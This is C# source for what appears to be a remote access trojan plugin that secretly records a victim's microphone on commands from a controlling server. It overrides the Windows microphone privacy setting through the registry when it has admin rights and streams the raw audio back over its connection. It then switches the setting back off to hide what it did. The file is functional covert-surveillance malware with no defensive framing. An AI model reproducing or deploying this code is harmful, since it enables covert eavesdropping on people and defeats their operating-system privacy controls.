using MessagePackLib.MessagePack;
using System;
using NAudio.Wave;
using NAudio.CoreAudioApi;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Collections.Concurrent;
using System.Security.Principal;


namespace Plugin
{
    public static class Packet
    {
        internal static bool IsOk { get; set; }
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "microphone":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "requestmicro":
                                    {
                                        SendMicros();
                                        break;
                                    }
                                case "audioY":
                                    {
                                        CheckMicrophoneDisponibility();
                                        if (IsOk == true) return;
                                        IsOk = true;
                                        Audio(unpack_msgpack.ForcePathObject("MicName").AsString);
                                        break;
                                    }
                                case "audioN":
                                    {
                                        if (IsOk == false) return;
                                        IsOk = false;
                                        StopAudio();
                                        break;
                                    }
                            }
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }


        public static bool wasDisabled = false;
        public static void CheckMicrophoneDisponibility()
        {
            if (!IsWindowsMicrophoneEnabled())
            {
                if (!IsAdministrator())
                {
                    Error("User is not admin, cannot turn on microphone services.");
                    return;
                }
                EnableWindowsMicrophone();
                wasDisabled = true;
            }
        }

        public static void SendMicros()
        {
            StringBuilder microphoneList = new StringBuilder();

            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();

            var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active);

            foreach (var device in devices)
            {
                microphoneList.Append(device.FriendlyName + "\\");
            }
            if (microphoneList.Length > 0)
            {
                microphoneList.Length--;
            }
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "microphone";
            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
            msgpack.ForcePathObject("Miclist").AsString = microphoneList.ToString();
            Connection.Send(msgpack.Encode2Bytes());
        }

        private static WaveInEvent waveIn;
        private static readonly ConcurrentQueue<byte[]> audioQueue = new ConcurrentQueue<byte[]>();
        private static System.Threading.Timer sendTimer;
        public static void Audio(string audInfo)
        {
            string[] audInfochar = audInfo.Split('\\');

            int micIndex = GetDeviceNumberFromName(audInfochar[0]);
            int audiorate = int.Parse(audInfochar[1]);
            int audiochannels = audInfochar[2] == "Stereo" ? 2 : 1;

            if (micIndex == -1)
            {
                // Microphone is not found! Using the default one.
                micIndex = 0; // Default to the first available device
            }
            try
            {
                waveIn = new WaveInEvent
                {
                    DeviceNumber = micIndex,
                    WaveFormat = new WaveFormat(audiorate, 16, audiochannels)
                };
                waveIn.DataAvailable += WaveInDataAvailable;
                waveIn.StartRecording();

                sendTimer = new System.Threading.Timer(SendAudioData, null, 0, 50);
            }
            catch
            {
                Connection.Disconnected();
            }
        }

        public static int GetDeviceNumberFromName(string deviceName)
        {
            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                var deviceInfo = WaveIn.GetCapabilities(i);
                if (deviceInfo.ProductName.Equals(deviceName, StringComparison.InvariantCultureIgnoreCase))
                {
                    return i;
                }
            }
            return -1;
        }
        private static void WaveInDataAvailable(object sender, WaveInEventArgs e)
        {
            if (Connection.IsConnected)
            {
                audioQueue.Enqueue(e.Buffer);
            }
        }

        private static void SendAudioData(object state)
        {
            while (audioQueue.TryDequeue(out byte[] audioData))
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "AudioActive";
                    msgpack.ForcePathObject("AudioBytes").SetAsBytes(audioData);
                    Connection.Send(msgpack.Encode2Bytes());
                }
                catch { }
            }
        }

        public static void StopAudio()
        {
            waveIn?.StopRecording();
            waveIn?.Dispose();
            waveIn = null;

            sendTimer?.Change(Timeout.Infinite, 0);
            sendTimer?.Dispose();

            if (wasDisabled)
            {
                DisableWindowsMicrophone();
            }
        }

        #region Checkers * Modifiers
        static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        static bool IsWindowsMicrophoneEnabled()
        {
            using (RegistryKey localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)) // Force 64-bit access
            using (RegistryKey key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone", false))
            {
                return key?.GetValue("Value")?.ToString() == "Allow"; // "Allow" = Enabled, "Deny" = Disabled
            }
        }

        static void EnableWindowsMicrophone()
        {
            using (RegistryKey localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)) // Force 64-bit access
            using (RegistryKey key = localMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
                RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                key.SetValue("Value", "Allow", RegistryValueKind.String);
            }
        }

        static void DisableWindowsMicrophone()
        {
            using (RegistryKey localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)) // Force 64-bit access
            using (RegistryKey key = localMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
                RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                key.SetValue("Value", "Deny", RegistryValueKind.String);
            }
        }

        #endregion
    }

}